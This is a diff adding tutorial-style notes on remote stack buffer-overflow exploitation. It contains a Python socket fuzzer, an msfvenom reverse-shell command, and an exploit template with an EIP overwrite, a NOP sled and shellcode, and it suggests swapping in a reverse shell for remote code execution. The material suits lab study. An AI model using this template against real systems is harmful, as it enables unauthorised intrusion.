@@ -226,3 +226,73 @@ msfvenom -l payloads | grep windows | grep reverse
 # Generate the shellcode
 msfvenom -p 'windows/shell_reverse_tcp' LHOST=OUR_IP LPORT=OUR_LISTENING_PORT -f 'python'
 ```
+
+## Remote fuzzing
+
+So far, we have been discussing about local buffer overflow. When it comes to remote, most of the parts are exactly the same, but the exploit construction is slightly different.
+
+Let's imagine we have a program that listens in port 8888 and accepts an input via network. We can automate the process of crashing with it with a small python script:
+
+```python
+import socket
+from struct import pack
+
+IP = "127.0.0.1"
+port = 8888
+
+def fuzz():
+    try:
+        for i in range(0,10000,500):
+            buffer = b"A"*i
+            print("Fuzzing %s bytes" % i)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((IP, port))
+            s.send(buffer)
+            breakpoint()
+            s.close()
+    except:
+        print("Could not establish a connection")
+
+fuzz()
+```
+
+When the script is executed, it loops through all the range. However, in the debugger, we see the EIP register overwritten with `A`. This indicates that the networking part is not vulnerable to buffer overflow, however the user-facing program it is and must be processing the input somehow.
+
+We can do this gradually by placing a breakpoint in the for loop to be able to give us some time to check the EIP register.
+
+## Building a remote exploit
+
+After fuzzing the listening port, the remaining buffer overflow identification and exploitation steps should be largely the same as local buffer overflow exploitation. The main steps we followed in previous sections were:
+
+- Fuzzing Parameters
+- Controlling EIP
+- Identifying Bad Characters
+- Finding a Return Instruction
+- Jumping to Shellcode
+
+Next, we need to determine the offset to write to the EIP. We do that by sending the data in the same way as we have been fuzzing the parameters. Then, check the EIP can be override with different value, then find bad characters, then find a good return address and finally generate the shellcode.
+
+The final exploit will be something like:
+
+```python
+def exploit():
+    # msfvenom -p 'windows/exec' CMD='calc.exe' -f 'python'
+    buf = b""
+    ...SNIP...
+    buf += b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
+
+    offset = 1052
+    buffer = b"A"*offset
+    eip = pack('<L', 0x0069D2E5)
+    nop = b"\x90"*32
+    payload = buffer + eip + nop + buf
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IP, port))
+    s.send(payload)
+    s.close()
+
+exploit()
+```
+
+We can change the payload to a reverse shell one and change the IP and port to effectively gain code execution over the remote server.
